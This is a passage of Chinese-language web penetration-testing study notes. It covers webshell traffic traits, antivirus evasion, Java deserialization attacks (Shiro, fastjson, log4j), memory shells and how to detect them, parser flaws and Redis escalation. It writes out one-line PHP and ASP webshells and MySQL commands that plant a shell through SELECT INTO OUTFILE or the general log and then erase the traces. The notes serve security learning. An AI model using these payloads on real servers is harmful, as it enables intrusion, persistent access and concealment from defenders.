Language=<span class="hljs-string">&quot;Javascript&quot;</span>%&gt;&lt;% <span class="hljs-keyword">eval</span>(Request.Item[<span class="hljs-string">&quot;test&quot;</span>],<span class="hljs-string">&quot;unsafe&quot;</span>);%&gt;<br></code></pre></td></tr></table></figure><h3 id="动态特征-2"><a href="#动态特征-2" class="headerlink" title="动态特征"></a><strong>动态特征</strong></h3><p>  1.payload 在请求体中，采用 url 编码 +base64 编码，<strong>payload 部分是明文传输</strong>。<br>  2.payload 中有 eval 或 assert、base64_decode 这样的字符。<br>  3.payload 中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样 base64 加密的攻击载荷<br>  4.参数 <strong>z0</strong> 对应 <code>$_POST[z0]</code> 接收到的数据，且固定为 QGluaV9zZXQ 开头。<br>  5.进行 base64 解码后可看到代码：<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);</code> 这段意思是首先关闭报错和 magic_quotes，接下来去获取主机的信息。</p><h1 id="web解析与编码"><a href="#web解析与编码" class="headerlink" title="web解析与编码"></a>web解析与编码</h1><p><a href="https://cloud.tencent.com/developer/article/1516371">浏览器解析与编码顺序及xss挖掘绕过全汇总-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>%接ascil字符</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627110534196.png" alt="image-20240627110534196"></p><h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>%开头；结尾。</p><p>中间英文或者#后接十进制数或#x后接十六进制数。<img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627110710381.png" alt="image-20240627110710381"></p><h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627110719051.png" alt="image-20240627110719051"></p><h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a>解析顺序</h2><p>浏览器解析：HTML文档被解析，生成DOM树和css样式表，遇到<script>标签的时候将控制权交给JS引擎</p><p>由于需要先生成DOM树再解析html编码内容，所以不可以将标签进行html编码<img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627111104232.png" alt="image-20240627111104232"></p><h2 id="解码顺序"><a href="#解码顺序" class="headerlink" title="解码顺序"></a>解码顺序</h2><p>HTML解码。JS解码。URL解码。</p><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a><strong>免杀方法</strong></h2><ol><li>修改特征码，猜测杀软对哪几个字节进行查杀，再对应修改（几乎没用了）</li><li>shellcode 加载器，改变加载到内存的方式和加密方式（主流）(分离免杀)</li><li>反射 dll 加载，把 dll 加密，远程下载到内存中再解密执行（高级）</li></ol><h3 id="无文件执行木马的方式有哪些？"><a href="#无文件执行木马的方式有哪些？" class="headerlink" title="无文件执行木马的方式有哪些？"></a><strong>无文件执行木马的方式有哪些？</strong></h3><p>powershell（脚本解析器） 》》》powershell.exe（应用程序）</p><p>VB.script（脚本解析器） 》》》cscript.exe（应用程序）</p><p>bat 处理 （脚本解析器） 》》》cmd.exe（应用程序）</p><p>javaSrtipt（脚本解析器） 》》》mshta.exe（应用程序）</p><h3 id="怎么做-shellcode-免杀？"><a href="#怎么做-shellcode-免杀？" class="headerlink" title="怎么做 shellcode 免杀？"></a><strong>怎么做 shellcode 免杀？</strong></h3><ol><li>编码</li><li>加壳</li><li>混淆</li><li>分离免杀</li><li>特征码修改</li><li>添加无用逻辑语句</li><li>重写 api</li></ol><h3 id="分离免杀怎么做？"><a href="#分离免杀怎么做？" class="headerlink" title="分离免杀怎么做？"></a><strong>分离免杀怎么做？</strong></h3><p>分为加载器和 shellcode 两部分，一般将 shellcode 存储在网页或者图片中，然后加载器远程加载存在 shellcode 的网页或者图片之类的</p><h3 id="powershell-怎么远程加载？"><a href="#powershell-怎么远程加载？" class="headerlink" title="powershell 怎么远程加载？"></a><strong>powershell 怎么远程加载？</strong></h3><p>可以远程加载 mimikazt，远控文件，exe 可执行文件实现无文件落地</p><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>1.高版本 php 不换行执行命令</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/LhlcbHJYfoayMNxlaQScjwZXn9c.png"></p><p>2.\报错</p><p>3.十六进制字符串（php7 不是数字，php5 是）</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Cuk1bYq8Boq2zqxstKXcOMWvnNd.png"></p><p>4.jspx CDATA 特性</p><blockquote><p>jsp 的后缀可以兼容为 jspx 的代码，也兼容 jspx 的所有特性，如 CDATA 特性 jspx 的后缀不兼容为 jsp 的代码，jspx 只能用 jspx 的格式 在 XML 元素里，< 和&是非法的，遇到 < 解析器会把该字符解释为新元素的开始，遇到&解析器会把该字符解释为字符实体化编码的开始 但是我们有时候有需要在 jspx 里添加 js 代码用到大量的 < 和&字符，因此可以将脚本代码定义为 CDATA CDATA 部分内容会被解析器忽略，此时 ameter 依旧会与 getPar 拼接成为 getParameter。</p></blockquote><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/YoZbbi8F5owxFqx29Ajcura9ndb.png"></p><p>5.实体化编码</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/GGJgbeXjJozLdNxmIdscfVaXnJe.png"></p><p>6.其他编码格式</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/GQz6bAqwuoEeocxKyUfcHWaVnnh.png"></p><h2 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf/cs"></a>msf/cs</h2><p>1.shellcode 加密</p><p>2.垃圾字节</p><p>3.硬编码单字节秘钥进行运算</p><p>4.移位</p><p>5.交换连续字节</p><h2 id="沙盒免杀"><a href="#沙盒免杀" class="headerlink" title="沙盒免杀"></a>沙盒免杀</h2><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/UIlfbtq5QozI0KxTerbc0YX2n4f.png"></p><h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><blockquote><p>base 加密网站 <a href="https://ares-x.com/tools/runtime-exec">Runtime.exec Payload Generater | AresX's Blog (</a><a href="https://ares-x.com/tools/runtime-exec">ares-x.com</a><a href="https://ares-x.com/tools/runtime-exec">)</a></p></blockquote><blockquote><p>java-web 内存马 <a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p></blockquote><p><strong>rO0AB：base64 加密的 java 对象</strong></p><blockquote><p><a href="https://xz.aliyun.com/t/7079">https://xz.aliyun.com/t/7079</a><br><a href="https://xz.aliyun.com/t/7264">https://xz.aliyun.com/t/7264</a></p></blockquote><h3 id="RMI-远程方法调用"><a href="#RMI-远程方法调用" class="headerlink" title="RMI(远程方法调用)"></a>RMI(远程方法调用)</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>RMI 实现了 java 利用远程服务器为具体的 java 方法提供接口，本地只需要根据接口类的定义来提供参数即可调用，依靠 <strong>JRMP(远程方法协议)</strong></p><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>1.传输的类必须可序列化</p><p>2.客户端服务器的 serialVersionUID 字段相同，</p><p>3.被远程调用方法的对象一定要实现 java.rmi.remote 接口，远程对象实现类必须继承 UnicastRemoteObject 类（或者构造方法调用 UnicastRemoteObject.exportObject()静态方法）</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/TB3zb4yneoiyxsx134scH38Mngc.png"></p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/PdyMb33REou8X1xZiL3cCVjPnMh.png"></p><h4 id="运行逻辑"><a href="#运行逻辑" class="headerlink" title="运行逻辑"></a>运行逻辑</h4><p>0.JDK 提供注册表功能，创建 RMIRegistry 对象监听 1099 端口</p><p>手动注册如下</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/WC0NbySPLoRKBpxd60QcflHbnKd.png"></p><p>1.服务器随机监听一个端口</p><p>2.客户端的 stub 通过 JRMP 协议封装数据,调用了上面的方法</p><p>3.连接服务端并提交参数</p><p>4.执行方法 返回结果给客户端</p><h3 id="JNDI-Java-命名和目录接口"><a href="#JNDI-Java-命名和目录接口" class="headerlink" title="JNDI(Java 命名和目录接口)"></a>JNDI(Java 命名和目录接口)</h3><p>JNDI 是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。</p><h2 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h2><p>(apache 安全框架）</p><h3 id="Shior550"><a href="#Shior550" class="headerlink" title="Shior550"></a>Shior550</h3><blockquote><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088">https://blog.csdn.net/Aaron_Miller/article/details/106475088</a></p></blockquote><p><strong>取出请求包中 rememberMe 的 cookie 值 => Base64 解码=>AES 解密（用到密钥 key,硬编码）=> 反序列化****。</strong>知道了秘钥就可以控制反序列化的内容来构造 pop 链</p><p>则 payload 构造：序列化=>AES 加密=>BASE64=> 写入 cookie</p><p>条件：获取 key，存在攻击链</p><blockquote><p>流程：攻击者搭建恶意 vps，存放反弹 shell（经过 base64 加密并且反序列化工具处理！这里的 base64 加密跟服务器无关，应该是为了免杀跟避免编码问题）的 payload1 并进行 JRMPListener，将上述 VPS JRMPListener 的地址进行 AES 加密和 base64 编码，构造请求包 cookie 中的 rememberMe 字段，向存在漏洞的服务器发送加密编码后的结果 payload2。<br>服务器接收到 payload2 进程 base64 解码 AES 解密，反序列化过程中触发 pop 链造成 payload2 中的语句执行，发现要和恶意 VPS 的 JRMP 通信，请求的过程中接收到了反弹 shell 的 payload1。</p></blockquote><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Rfedb2I1KoKqtAx3twfcd87FnTa.png"></p><h3 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h3><blockquote><p>由于 Apache Shiro cookie 中通过 AES-128-CBC 模式加密的 rememberMe 字段存在问题，用户可通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p></blockquote><p>条件：合法 cookie，攻击链</p><h2 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h2><p>（json 跟 java 对象转换库）</p><blockquote><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p></blockquote><p>要求：RMI 服务的开启（x）,没过滤 json 格式，fastjson 版本</p><h3 id="fastjson-查看版本"><a href="#fastjson-查看版本" class="headerlink" title="fastjson 查看版本"></a>fastjson 查看版本</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/KWtlbPdXSoJd9gxjZo9cC6opnnh.png"></p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Kpbcb10APoZLuQxqpoJcQrfgnwd.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson 可以操作任何 Java 对象，<strong>即使是一些预先存在的没有源码的对象</strong></p><p>AutoType 功能(代替了 setter/getter，避免了两个对象反序列化丢失子类)，fastjson 在对 json 字符串反序列化的时候，会读取到 @type 的内容，将 json 内容反序列化为 java 对象并调用这个类的 setter 方法。</p><h3 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h3><p>1.（配合 RMI 服务）我们搭建一个远程恶意站点，然后构造语句去让服务器反序列的时候访问 rmi 服务器，rmi 服务器来执行我们在恶意站点上的 class 文件</p><p>2.传入恶意的 TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java 实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>1.一种是直接将命令执行结果写入到静态资源文件里，如 html、js 等，然后通过 http 访问就可以直接看到结果</p><p>2.通过 dnslog 进行数据外带，但如果无法执行 dns 请求就无法验证了</p><p>3.直接将命令执行结果回显到请求 Poc 的 HTTP 响应中</p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>(用于解析 java，部署大型分布式 Web 应用的 Web 中间件。）</p><p>分类：</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Hjw5b5XHQofnYuxKsuoc4D6Bnzg.png"></p><p>1.weblogic 控制台的 7001 端口默认开启 T3 协议服务，T3 协议缺陷实现了 RMI</p><p>2.weblogic WLS Security 组件对外提供 webservice，使用 XMLDecoder 解析 XML 数据，存在反序列化漏洞</p><h2 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h2><p>（apache 日志库）</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/BFVPbPpJjo19anxOaf3cGbFmncf.png"></p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/HT0TbHBsZoo4QUxSpaRc5kH3nFf.png"></p><h3 id="远程代码执行原理"><a href="#远程代码执行原理" class="headerlink" title="远程代码执行原理"></a>远程代码执行原理</h3><p>日志在打印的时候遇到 ${后以：分割为 prefix 和 key，对于 prefix 会调用 lookup 方法并且带入 key 参数</p><p>由于 JNDI 出栈没有做好过滤,攻击者利用 lookup 功能对{}内内容的解析进行 JNDI 注入，受害者请求远程服务来链接本地对象，在{}中调用 JNDI 接口（LDAP/RMI 服务）向攻击者提前部署好的恶意站点获取恶意的.class 对象并运行代码</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Skekbkecbomq9QxJHFvcVk4onHh.png"></p><p>此时的 JNDI 服务调用 RMI 服务，RMI 通过 Reference 类绑定了一个外部远程对象</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/J2DobQIXpoIyVPxFzfpcux7Fnvd.png"></p><h3 id="原理流程"><a href="#原理流程" class="headerlink" title="原理流程"></a>原理流程</h3><p>1.目标代码调用了 InitialContext.lookup(URI)且 URL 为恶意 RMI 地址</p><p>2.恶意 RMI 服务器返回一个 Reference 对象，其中有一个恶意的 factory 类</p><p>3.factory 被动态加载并且实例化，接着调用 factory.getObjectInstance()获取外部远程对象实例</p><p>（代码可以写入 factory 类的 getObjectInstance，构造方法，静态代码块等位置）</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>编写反弹 shell 语句，base64 编码。攻击机上存放恶意.java 文件并且编译为.class，同一目录下开启 http 服务，开启 LDAP 服务(1389 端口)</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/QcR8bXl6vo1aMqxVCbncLLVpnqc.png"></p><p>再新建一个 shell 开启监听，在 JNDL 注入点，最后的是 class 文件名前缀，ip 是 http 服务的 ip</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/DPXqb3UMMoqOGIx7MsVcfzIinPg.png"></p><h2 id="struct2"><a href="#struct2" class="headerlink" title="struct2"></a>struct2</h2><p>.action 文件</p><p>用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><blockquote><p>原理：通过在 Java 虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在 Java 虚拟机中注入特定的 Java 类、变量或方法等 Java 对象，然后在 Java 虚拟机中运行这些代码，实现对受害者机器的远程控制</p></blockquote><h3 id="Tomcat-实现内存马的方式"><a href="#Tomcat-实现内存马的方式" class="headerlink" title="Tomcat 实现内存马的方式"></a><strong>Tomcat 实现内存马的方式</strong></h3><h4 id="Servlet-API-型"><a href="#Servlet-API-型" class="headerlink" title="Servlet-API 型"></a><strong>Servlet-API 型</strong></h4><p>  通过命令执行等方式动态注册一个新的 listener、filter 或者 servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如 tomcat 的 valve 内存马</p><h5 id="filter-型内存马"><a href="#filter-型内存马" class="headerlink" title="filter 型内存马"></a><strong>filter 型内存马</strong></h5><p>  所谓 filter 内存马，就是在 web 容器中创建了含有恶意代码的 filter，在请求传递到 servlet 前被拦截下来且执行了恶意代码。</p><h5 id="servlet-型内存马"><a href="#servlet-型内存马" class="headerlink" title="servlet 型内存马"></a><strong>servlet 型内存马</strong></h5><p>  servlet 型的内存马原理就是注册一个恶意的 servlet，与 filter 相似，只是创建过程不同。</p><p>  核心还是看 StandardContext，在 init filter 后就调用了 loadOnStartup 方法实例化 servlet</p><p>  可以发现 servlet 的相关信息是保存在 StandardContext 的 children 字段。</p><h5 id="listener-型内存马"><a href="#listener-型内存马" class="headerlink" title="listener 型内存马"></a><strong>listener 型内存马</strong></h5><p>  listener 用于监听时间的发生或状态的改变，其初始化与调用顺序在 filter 之前。</p><p>  listener 选择很多。我们选择与 request 相关的 ServletRequestListener。</p><p>  Tomcat 使用两类 Listener 接口分别是 org.apache.catalina.LifecycleListener 和原生 Java.util.EventListener。</p><p>  一般作为 webshell，需要对网站发送请求使用 Java.util.EventListener。</p><h4 id="字节码增强型"><a href="#字节码增强型" class="headerlink" title="字节码增强型"></a><strong>字节码增强型</strong></h4><p>  通过 java 的 instrumentation 动态修改已有代码，进而实现命令执行等功能。</p><h4 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a><strong>查杀思路</strong></h4><ul><li>利用 Java Agent 遍历加载到内存中的 Class</li><li>先判断是否是内存马，是则进入内存查杀。</li></ul><h4 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a><strong>特征判断</strong></h4><ul><li><p>（名字）根据 shell 或者随机数关键字</p></li><li><p>（优先级）根据 Filter 优先级；为了使权限最大化，保证在各种情况下都可以访问，需要把优先级调到最高</p></li><li><p>（加载器）根据特殊的 classloader（类加载器）、 Filter 对应的 ClassLoader 目录进行检测； Filter 也是一种 Class，必定需要特定的 classloader（类加载器）</p></li><li><p>（恶意代码）把内存中 class 导出，反编译之后查看是否存在恶意代码；如调用的了一些特殊的方法</p><ul><li>java.lang.Runtime.getRuntime</li><li>defineClass</li><li>Invoke</li></ul></li><li><p>（配置）web.xml 中没有 fitter 配置</p></li></ul><h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>Jboss 是一个管理 EJB 的容器和服务器。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>jbossmq-httpil/HTTPServerILServlet<br>invoker/readonly<br>invoker/JMXInvokerServlet</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>程序获取 http 请求数据保存到 httpRequest 中，进一步处理后保存到变量 ois 中，然后程序没有对该数据进行过滤，直接使用 readObject()方法进行反序列化。</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><h3 id="Select-into-outfile-写入"><a href="#Select-into-outfile-写入" class="headerlink" title="Select into outfile 写入"></a>Select into outfile 写入</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>1.web 目录写权限以及单引号</p><p>2.绝对路径（phpinfo/php 探针/报错）</p><p>3.secure_file_priv 没有具体值</p><blockquote><p>show global variables like '%secure%'; 查看当前设置<br>1.当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权</p><ol start="2"><li>当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入 | 导出只能发生在 /tmp/ 目录下，此时也无法提权</li><li>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权 在 MySQL 的配置文件 my.ini 中进行配置</li></ol></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; INTO OUTFILE &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\a.php&#x27; 这里需要注意的一个点是路径需要用”\“</span><br></code></pre></td></tr></table></figure><h3 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h3><p>1.查看配置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE ‘<span class="hljs-comment">%general%</span><br>查看mysql的日志状态，默认是关闭的<br>general_log_file为日志保存的位置<br></code></pre></td></tr></table></figure><p>2.开启 general_log 模式</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log = <span class="hljs-keyword">on</span>;<br>记录用户输入的每条命令并保存在 C:\phpStudy\MySQL\<span class="hljs-built_in">data</span>\stu1.<span class="hljs-keyword">log</span> 的文件中<br>开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过<span class="hljs-keyword">log</span>日志进行写入一句话木马，然后再进一步利用<br></code></pre></td></tr></table></figure><p>3.修改日志目录为 shell 地址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>4.写入 shell 并连接利用</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>5.抹除痕迹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">off</span>;<br><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="绕过disable-funcion"><a href="#绕过disable-funcion" class="headerlink" title="绕过disable_funcion"></a>绕过disable_funcion</h2><blockquote><p><a href="https://www.cnblogs.com/zw1sh/p/12632126.html">bypass disable_function的方法及蚁剑插件bypass-php-function使用 - zw1sh - 博客园 (cnblogs.com)</a></p></blockquote><h3 id="apache-mod-cgi"><a href="#apache-mod-cgi" class="headerlink" title="apache mod_cgi"></a>apache mod_cgi</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627173315087.png" alt="image-20240627173315087"></p><p>前提<img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627173252656.png" alt="image-20240627173252656"></p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/image-20240627173423213.png" alt="image-20240627173423213"></p><h3 id="LD-preload"><a href="#LD-preload" class="headerlink" title="LD_preload"></a>LD_preload</h3><h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h4 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h4><h4 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h4><h2 id="PHP-爆路径"><a href="#PHP-爆路径" class="headerlink" title="PHP 爆路径"></a>PHP 爆路径</h2><p>单引号，错误路径报错</p><p>phpinfo 和 phpmyadmin 探针</p><p>任意文件读取</p><p>图片路径</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>路径：(_SERVER[“SCRIPT_FILENAME”])</p><p>支持程序：如redis，mysql，fastcgi，gopher</p><p>真实ip：(_SERVER[“SERVER_ADDR”] （绕cdn）</p><p>敏感配置：远程文件包含，文件读取，禁用函数名，基础目录，短标签，配置文件位置</p><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="5-x-6-x"><a href="#5-x-6-x" class="headerlink" title="5.x-6.x"></a>5.x-6.x</h3><p>1.默认可执行：asp /sp.asa /sp.cer /sp.cdx</p><p>2.目录解析/xx.asp/xx.jpg(控制文件夹名字就可以让此文件夹下文件执行)</p><p>3.文件解析 ap.asp;,jpg （分号后面不解析）</p><h3 id="7-0-7-5-之前"><a href="#7-0-7-5-之前" class="headerlink" title="7.0-7.5 之前"></a>7.0-7.5 之前</h3><p>默认开启 Fast-CGI</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Su01byOoWoZ48pxdmpUc24l5nud.png"></p><p>上传如上文件，访问路径/1.php 会导致图片被解析为 php 并生成 shell</p><h2 id="Ngnix"><a href="#Ngnix" class="headerlink" title="Ngnix"></a>Ngnix</h2><h3 id=""><a href="#" class="headerlink" title=""></a><0.8.37</h3><p>和 IIS 7.0/7.5 一致</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/Dv0UbKkPeoWXlUx6jJ0cEW5Anvc.png"></p><h3 id="00-空字节"><a href="#00-空字节" class="headerlink" title="%00 空字节"></a>%00 空字节</h3><p>Nginx 0.5.*</p><p>Nginx 0.6.*</p><p>Nginx 0.7 <= 0.7.65</p><p>Nginx 0.8 <= 0.8.37</p><p>xx.jpg%00.php</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h3><p>从右到左，例如上传一个 xie.php.rar，无法识别 rar 会走到 php</p><h3 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/WX10b59fboQWbixYrtYcVfG1nLb.png"></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/WeWEbB3xWojY1Qxt1oUchbdinSc.png"></p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>windows： xx.jpg[空格或.]会被默认删除，可绕过黑名单</p><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/FHcRb7GQzoyOj4x05fxc6dAon7g.png"></p><h1 id="Redis-提权"><a href="#Redis-提权" class="headerlink" title="Redis 提权"></a>Redis 提权</h1><p><img src="/2024/03/21/web%E7%9F%A5%E8%AF%86%E7%82%B9/DYuWb0o8yocza9xZvffcxu82nye.png"></p><p><a href="https://www.cnblogs.com/h0cksr/p/16189728.html">渗透测试怎么利用 Redis 提权 - h0cksr - 博客园 (cnblogs.com)</a></p><p>默认端口 6379</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>一.登录 redis</p><p>默认无密码与弱口令/未授权访问</p><p>二.提权</p><p>1.写入 webshell</p><p>2.公私钥获取 root 权限</p><p>3.crontab 定时任务反弹 shell</p><p>4.主从复制 rce</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>更改端口</p><p>修改口令</p><p>绑定内网</p><p>开启保护模式</p><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>21 端口：FTP 文件传输协议端口，用来捕获黑客的 FTP 爆破行为<br>22 端口：SSH 端口 链接 Linux 主机 SSH 